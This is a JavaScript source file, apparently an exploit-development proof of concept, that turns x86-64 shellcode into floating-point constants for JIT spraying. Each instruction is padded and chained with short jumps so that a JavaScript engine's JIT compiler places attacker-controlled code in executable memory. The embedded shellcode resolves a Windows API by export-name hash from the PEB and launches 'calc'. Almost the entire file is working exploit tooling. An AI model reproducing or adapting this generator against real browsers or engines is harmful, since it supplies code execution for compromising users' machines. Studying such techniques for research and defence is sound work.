// Axel '0vercl0k' Souchet - 14 October 2018
const Debug = false;
let dbg = c => c;
if(Debug) {
    dbg = print;
}

function b2f(A) {
    if(A.length != 8) {
        throw 'Needs to be an 8 bytes long array';
    }

    const Bytes = new Uint8Array(A);
    const Doubles = new Float64Array(Bytes.buffer);
    return Doubles[0];
}

function gen_func_jitpayload(Payload) {
    const FunctionBody = ['function BringYourOwnPayload() {'];
    let CurrentStream = [];
    let Idx = 0;
    let Show = false;
    for(let Idx = 0; Idx < Payload.length; Idx++) {

        let CurrentInstr = Payload[Idx];
        let NextInstr = ((Idx + 1) >= Payload.length) ? null : Payload[Idx + 1];

        //
        // If we encounter an instruction bigger than 6 bytes we error out,
        // as we can't encode it (need 2bytes for jmp short).
        //

        const IsMagic = CurrentInstr.map(c => String.fromCharCode(c)).join('') == '0vercl0k';
        if(IsMagic) {
            Show = true;
        }

        if(!IsMagic && CurrentInstr.length > 6) {
            throw 'Cannot encode instructions bigger than 6 bytes @ ' + CurrentInstr;
        }

        //
        // Accumulate it!
        //

        for(const Byte of CurrentInstr) {
            CurrentStream.push(Byte);
        }

        if(Show) {
            dbg('[+] Accumulated ' + CurrentInstr.length + ' bytes');
        }

        //
        // Time to encode it!
        //

        if(!IsMagic) {
            const ToAdd = [0xEB, 0x09];
            const PaddingBytes = 8 - (CurrentStream.length + ToAdd.length);
            for(let _ = 0; _ < PaddingBytes; _++) {
                CurrentStream.unshift(0x90);
            }

            CurrentStream.push(...ToAdd);
        }

        const Cst = b2f(CurrentStream);
        FunctionBody.push('    const J' + Idx + ' = ' + Cst + ';');
        if(Show) {
            dbg('[+] Encoded ' + CurrentStream);
        }
        CurrentStream = [];
    }

    FunctionBody.push('}');
    return FunctionBody.join('\n');
}

const Payload = [];

for(let Idx = 0; Idx < 0x241; Idx++) {
    Payload.unshift([0x90]);
}

Payload.push(...[
    // Magic
    [0x30, 0x76, 0x65, 0x72, 0x63, 0x6c, 0x30, 0x6b],
    [0x90],
    // 0000: 50 push rax
    [0x50],
    // 0011: 53 push rbx
    [0x53],
    // 0022: 51 push rcx
    [0x51],
    // 0033: 52 push rdx
    [0x52],
    // 0044: 55 push rbp
    [0x55],
    // 0055: 56 push rsi
    [0x56],
    // 0066: 57 push rdi
    [0x57],
    // 0076: 4150 push r8
    [0x41, 0x50],
    // 0087: 4151 push r9
    [0x41, 0x51],
    // 0098: 4152 push r10
    [0x41, 0x52],
    // 00a9: 4153 push r11
    [0x41, 0x53],
    // 00ba: 4154 push r12
    [0x41, 0x54],
    // 00cb: 4155 push r13
    [0x41, 0x55],
    // 00dc: 4156 push r14
    [0x41, 0x56],
    // 00ed: 4157 push r15
    [0x41, 0x57],
    // 00fd: 4989e3 mov r11, rsp
    [0x49, 0x89, 0xe3],
    // 010d: 4883ec10 sub rsp, 0x10
    [0x48, 0x83, 0xec, 0x10],
    // 011e: 4883ec70 sub rsp, 0x70
    [0x48, 0x83, 0xec, 0x70],
    // 012f: 4883ec70 sub rsp, 0x70
    [0x48, 0x83, 0xec, 0x70],
    // 0140: 6683e4f0 and sp, 0xfff0
    [0x66, 0x83, 0xe4, 0xf0],
    // 0150: b863616c63 mov eax, 0x636c6163
    [0xb8, 0x63, 0x61, 0x6c, 0x63],
    // 0163: 890424 mov dword ptr [rsp], eax
    [0x89, 0x04, 0x24],
    // 0172: c644240400 mov byte ptr [rsp + 4], 0
    [0xc6, 0x44, 0x24, 0x04, 0x00],
    // 0186: 31c0 xor eax, eax
    [0x31, 0xc0],
    // 0195: 49895b08 mov qword ptr [r11 + 8], rbx
    [0x49, 0x89, 0x5b, 0x08],
    // 01a6: 498d7b88 lea rdi, qword ptr [r11 - 0x78]
    [0x49, 0x8d, 0x7b, 0x88],
    // 01b7: 49897310 mov qword ptr [r11 + 0x10], rsi
    [0x49, 0x89, 0x73, 0x10],
    // 01c7: b968000000 mov ecx, 0x68
    [0xb9, 0x68, 0x00, 0x00, 0x00],
    // 01db: 31ed xor ebp, ebp
    [0x31, 0xed],
    // 01ec: f3aa rep stosb byte ptr [rdi], al
    [0xf3, 0xaa],
    // 01fa: c644247068 mov byte ptr [rsp + 0x70], 0x68
    [0xc6, 0x44, 0x24, 0x70, 0x68],
    // 020b: b860000000 mov eax, 0x60
    [0xb8, 0x60, 0x00, 0x00, 0x00],
    // 021c: 6567488b00 mov rax, dword ptr gs:[eax]
    [0x65, 0x67, 0x48, 0x8b, 0x00],
    // 022e: 488b4818 mov rcx, qword ptr [rax + 0x18]
    [0x48, 0x8b, 0x48, 0x18],
    // 023f: 4c8b4110 mov r8, qword ptr [rcx + 0x10]
    [0x4c, 0x8b, 0x41, 0x10],
    // 0250: 498b7860 mov rdi, qword ptr [r8 + 0x60]
    [0x49, 0x8b, 0x78, 0x60],
    // 0262: 4989f9 mov r9, rdi
    [0x49, 0x89, 0xf9],
    // 0273: 4885ff test rdi, rdi
    [0x48, 0x85, 0xff],
    // 0281: 0f841e010000 je 0x3a5
    [0x0f, 0x84, 0x1e, 0x01, 0x00, 0x00],
    // 0295: 0fb70f movzx ecx, word ptr [rdi]
    [0x0f, 0xb7, 0x0f],
    // 02a4: b805150000 mov eax, 0x1505
    [0xb8, 0x05, 0x15, 0x00, 0x00],
    // 02b8: 89ea mov edx, ebp
    [0x89, 0xea],
    // 02c8: 6685c9 test cx, cx
    [0x66, 0x85, 0xc9],
    // 02d6: 0f84c9000000 je 0x3a5
    [0x0f, 0x84, 0xc9, 0x00, 0x00, 0x00],
    // 02e9: 0f182400 nop dword ptr [rax + rax]
    [0x0f, 0x18, 0x24, 0x00],
    // 02fb: 0fb7c9 movzx ecx, cx
    [0x0f, 0xb7, 0xc9],
    // 030d: ffc2 inc edx
    [0xff, 0xc2],
    // 031d: 6bc021 imul eax, eax, 0x21
    [0x6b, 0xc0, 0x21],
    // 032f: 01c8 add eax, ecx
    [0x01, 0xc8],
    // 0340: 89d1 mov ecx, edx
    [0x89, 0xd1],
    // 034f: 0fb70c57 movzx ecx, word ptr [rdi + rdx*2]
    [0x0f, 0xb7, 0x0c, 0x57],
    // 0361: 6685c9 test cx, cx
    [0x66, 0x85, 0xc9],
    // 0373: 7586 jne 0x2fb
    [0x75, 0x86],
    // 0381: 3d5595db6d cmp eax, 0x6ddb9555
    [0x3d, 0x55, 0x95, 0xdb, 0x6d],
    // 0391: 0f8494010000 je 0x52b
    [0x0f, 0x84, 0x94, 0x01, 0x00, 0x00],
    // 03a5: 4d8b00 mov r8, qword ptr [r8]
    [0x4d, 0x8b, 0x00],
    // 03b5: 498b7860 mov rdi, qword ptr [r8 + 0x60]
    [0x49, 0x8b, 0x78, 0x60],
    // 03c7: 4c39cf cmp rdi, r9
    [0x4c, 0x39, 0xcf],
    // 03d5: 0f8598feffff jne 0x273
    [0x0f, 0x85, 0x98, 0xfe, 0xff, 0xff],
    // 03e7: b801000000 mov eax, 1
    [0xb8, 0x01, 0x00, 0x00, 0x00],
    // 03f8: 488d642470 lea rsp, qword ptr [rsp + 0x70]
    [0x48, 0x8d, 0x64, 0x24, 0x70],
    // 040a: 4883c470 add rsp, 0x70
    [0x48, 0x83, 0xc4, 0x70],
    // 041b: 4883c418 add rsp, 0x18
    [0x48, 0x83, 0xc4, 0x18],
    // 042e: 415f pop r15
    [0x41, 0x5f],
    // 043f: 415e pop r14
    [0x41, 0x5e],
    // 0450: 415d pop r13
    [0x41, 0x5d],
    // 0461: 415c pop r12
    [0x41, 0x5c],
    // 0472: 415b pop r11
    [0x41, 0x5b],
    // 0483: 4159 pop r9
    [0x41, 0x59],
    // 0494: 4158 pop r8
    [0x41, 0x58],
    // 04a6: 5f pop rdi
    [0x5f],
    // 04b7: 5e pop rsi
    [0x5e],
    // 04c8: 5d pop rbp
    [0x5d],
    // 04d9: 5a pop rdx
    [0x5a],
    // 04ea: 59 pop rcx
    [0x59],
    // 04fb: 5b pop rbx
    [0x5b],
    // 050c: 58 pop rax
    [0x58],
    // 051d: c3 ret
    [0xc3],
    // 052b: 4d8b5030 mov r10, qword ptr [r8 + 0x30]
    [0x4d, 0x8b, 0x50, 0x30],
    // 053d: 4d85d2 test r10, r10
    [0x4d, 0x85, 0xd2],
    // 054b: 0f8496feffff je 0x3e7
    [0x0f, 0x84, 0x96, 0xfe, 0xff, 0xff],
    // 055e: 4963423c movsxd rax, dword ptr [r10 + 0x3c]
    [0x49, 0x63, 0x42, 0x3c],
    // 056f: 4a8d0c10 lea rcx, qword ptr [rax + r10]
    [0x4a, 0x8d, 0x0c, 0x10],
    // 0580: 4883c170 add rcx, 0x70
    [0x48, 0x83, 0xc1, 0x70],
    // 0591: 4883c118 add rcx, 0x18
    [0x48, 0x83, 0xc1, 0x18],
    // 05a4: 8b09 mov ecx, dword ptr [rcx]
    [0x8b, 0x09],
    // 05b5: 85c9 test ecx, ecx
    [0x85, 0xc9],
    // 05c2: 0f841ffeffff je 0x3e7
    [0x0f, 0x84, 0x1f, 0xfe, 0xff, 0xff],
    // 05d4: 458b4c0a20 mov r9d, dword ptr [r10 + rcx + 0x20]
    [0x45, 0x8b, 0x4c, 0x0a, 0x20],
    // 05e6: 498d040a lea rax, qword ptr [r10 + rcx]
    [0x49, 0x8d, 0x04, 0x0a],
    // 05f8: 8b5824 mov ebx, dword ptr [rax + 0x24]
    [0x8b, 0x58, 0x24],
    // 0609: 4d01d1 add r9, r10
    [0x4d, 0x01, 0xd1],
    // 061a: 8b701c mov esi, dword ptr [rax + 0x1c]
    [0x8b, 0x70, 0x1c],
    // 062b: 4c01d3 add rbx, r10
    [0x4c, 0x01, 0xd3],
    // 063b: 448b5818 mov r11d, dword ptr [rax + 0x18]
    [0x44, 0x8b, 0x58, 0x18],
    // 064d: 4c01d6 add rsi, r10
    [0x4c, 0x01, 0xd6],
    // 065e: 4189e8 mov r8d, ebp
    [0x41, 0x89, 0xe8],
    // 066f: 4585db test r11d, r11d
    [0x45, 0x85, 0xdb],
    // 067d: 0f8464fdffff je 0x3e7
    [0x0f, 0x84, 0x64, 0xfd, 0xff, 0xff],
    // 0690: 0f182400 nop dword ptr [rax + rax]
    [0x0f, 0x18, 0x24, 0x00],
    // 06a2: 418b39 mov edi, dword ptr [r9]
    [0x41, 0x8b, 0x39],
    // 06b1: b905150000 mov ecx, 0x1505
    [0xb9, 0x05, 0x15, 0x00, 0x00],
    // 06c4: 4c01d7 add rdi, r10
    [0x4c, 0x01, 0xd7],
    // 06d6: 89ea mov edx, ebp
    [0x89, 0xea],
    // 06e6: 0fb607 movzx eax, byte ptr [rdi]
    [0x0f, 0xb6, 0x07],
    // 06f8: 84c0 test al, al
    [0x84, 0xc0],
    // 0705: 0f84eb000000 je 0x7f6
    [0x0f, 0x84, 0xeb, 0x00, 0x00, 0x00],
    // 0719: 0fbec0 movsx eax, al
    [0x0f, 0xbe, 0xc0],
    // 072b: ffc2 inc edx
    [0xff, 0xc2],
    // 073b: 6bc921 imul ecx, ecx, 0x21
    [0x6b, 0xc9, 0x21],
    // 074d: 01c1 add ecx, eax
    [0x01, 0xc1],
    // 075e: 89d0 mov eax, edx
    [0x89, 0xd0],
    // 076d: 0fb6043a movzx eax, byte ptr [rdx + rdi]
    [0x0f, 0xb6, 0x04, 0x3a],
    // 0780: 84c0 test al, al
    [0x84, 0xc0],
    // 0791: 7586 jne 0x719
    [0x75, 0x86],
    // 07a3: 50 push rax
    [0x50],
    // 07b2: 4889c8 mov rax, rcx
    [0x48, 0x89, 0xc8],
    // 07c1: 3d192eb5ae cmp eax, 0xaeb52e19
    [0x3d, 0x19, 0x2e, 0xb5, 0xae],
    // 07d6: 58 pop rax
    [0x58],
    // 07e6: 7463 je 0x84b
    [0x74, 0x63],
    // 07f6: 41ffc0 inc r8d
    [0x41, 0xff, 0xc0],
    // 0806: 4983c104 add r9, 4
    [0x49, 0x83, 0xc1, 0x04],
    // 0818: 4539d8 cmp r8d, r11d
    [0x45, 0x39, 0xd8],
    // 0826: 0f8276feffff jb 0x6a2
    [0x0f, 0x82, 0x76, 0xfe, 0xff, 0xff],
    // 0838: e9aafbffff jmp 0x3e7
    [0xe9, 0xaa, 0xfb, 0xff, 0xff],
    // 084b: 4489c0 mov eax, r8d
    [0x44, 0x89, 0xc0],
    // 085b: 0fb70c43 movzx ecx, word ptr [rbx + rax*2]
    [0x0f, 0xb7, 0x0c, 0x43],
    // 086d: 8b048e mov eax, dword ptr [rsi + rcx*4]
    [0x8b, 0x04, 0x8e],
    // 087e: 4c01d0 add rax, r10
    [0x4c, 0x01, 0xd0],
    // 088c: 0f8455fbffff je 0x3e7
    [0x0f, 0x84, 0x55, 0xfb, 0xff, 0xff],
    // 089e: 488d4c2410 lea rcx, qword ptr [rsp + 0x10]
    [0x48, 0x8d, 0x4c, 0x24, 0x10],
    // 08b1: 4531c9 xor r9d, r9d
    [0x45, 0x31, 0xc9],
    // 08c0: 48894c2448 mov qword ptr [rsp + 0x48], rcx
    [0x48, 0x89, 0x4c, 0x24, 0x48],
    // 08d2: 488d1424 lea rdx, qword ptr [rsp]
    [0x48, 0x8d, 0x14, 0x24],
    // 08e2: 488d4c2470 lea rcx, qword ptr [rsp + 0x70]
    [0x48, 0x8d, 0x4c, 0x24, 0x70],
    // 08f4: 4883c110 add rcx, 0x10
    [0x48, 0x83, 0xc1, 0x10],
    // 0906: 4531c0 xor r8d, r8d
    [0x45, 0x31, 0xc0],
    // 0915: 48894c2440 mov qword ptr [rsp + 0x40], rcx
    [0x48, 0x89, 0x4c, 0x24, 0x40],
    // 0929: 31c9 xor ecx, ecx
    [0x31, 0xc9],
    // 0937: 48896c2438 mov qword ptr [rsp + 0x38], rbp
    [0x48, 0x89, 0x6c, 0x24, 0x38],
    // 0948: 48896c2430 mov qword ptr [rsp + 0x30], rbp
    [0x48, 0x89, 0x6c, 0x24, 0x30],
    // 095a: 896c2428 mov dword ptr [rsp + 0x28], ebp
    [0x89, 0x6c, 0x24, 0x28],
    // 096b: 896c2420 mov dword ptr [rsp + 0x20], ebp
    [0x89, 0x6c, 0x24, 0x20],
    // 097e: ffd0 call rax
    [0xff, 0xd0],
    // 098f: 31c0 xor eax, eax
    [0x31, 0xc0],
    // 099d: e956faffff jmp 0x3f8
    [0xe9, 0x56, 0xfa, 0xff, 0xff],
]);

print(gen_func_jitpayload(Payload));
